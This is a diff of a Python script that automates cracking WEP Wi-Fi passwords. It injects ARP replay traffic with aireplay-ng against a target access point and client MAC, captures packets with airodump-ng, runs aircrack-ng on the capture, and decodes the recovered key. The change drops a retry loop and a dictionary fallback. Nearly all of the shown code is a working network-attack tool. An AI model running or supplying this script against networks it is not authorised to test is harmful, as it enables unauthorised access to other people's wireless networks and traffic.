@@ -13,46 +13,41 @@ def aireplay(interface, ap_mac_address, c_mac, seconds):
     try:
         command = subprocess.run(['aireplay-ng', '-3', '-b', ap_mac_address, '-h',
                        c_mac, interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=seconds)
-        print(command.args)
+        # print(command.args)
     except subprocess.TimeoutExpired:
         pass
 
 
-def wep_crack(interface, ap_mac_address, c_mac, channel, directory, seconds, dictionary):
-    orignial_time = seconds
+def wep_crack(interface, ap_mac_address, c_mac, channel, directory, seconds, ctr):
     pcapfilewep = os.path.join(directory, 'wep')
     passfile = os.path.join(directory, 'wep_password')
     change_channel(interface, channel)
     print(pcapfilewep)
-    ctr = 1
-    while ctr < 4:
-        print(f'Starting iteration {ctr}')
-        a = Thread(target=aireplay, args=(
-            interface, ap_mac_address, c_mac, seconds,))
-        b = Thread(target=airodump, args=(
-            interface, ap_mac_address, channel, pcapfilewep, seconds,))
-        a.start()
-        b.start()
+    
+    a = Thread(target=aireplay, args=(
+        interface, ap_mac_address, c_mac, seconds,))
+    b = Thread(target=airodump, args=(
+        interface, ap_mac_address, channel, pcapfilewep, seconds,))
+    a.start()
+    b.start()
 
-        time.sleep(seconds)
-        a.join()
-        b.join()
-        try:
-            subprocess.run(['aircrack-ng', f'{pcapfilewep}-0{ctr}.cap', '-l',
-                            f'{passfile}'], stdout=subprocess.DEVNULL, timeout=10)
-        except subprocess.TimeoutExpired:
-            pass
+    time.sleep(seconds)
+    a.join()
+    b.join()
+    try:
+        subprocess.run(['aircrack-ng', f'{pcapfilewep}-0{ctr}.cap', '-l',
+                        f'{passfile}'], stdout=subprocess.DEVNULL, timeout=10)
+    except subprocess.TimeoutExpired:
+        pass
 
-        if os.path.exists(passfile):
-            with open(passfile, 'r') as f:
-                password = bytes.fromhex(f.read()).decode()
-            return password
-        else:
-            print('Failed, increasing time')
-            seconds += orignial_time
-            ctr += 1
+    if os.path.exists(passfile):
+        with open(passfile, 'r') as f:
+            password = bytes.fromhex(f.read()).decode()
+        return password
+    else:
+        return None
 
-    wep_crack_no_ivs(pcapfilewep, dictionary)
+    
 
 
 def wep_crack_no_ivs(pcapfilewep, dictionary):
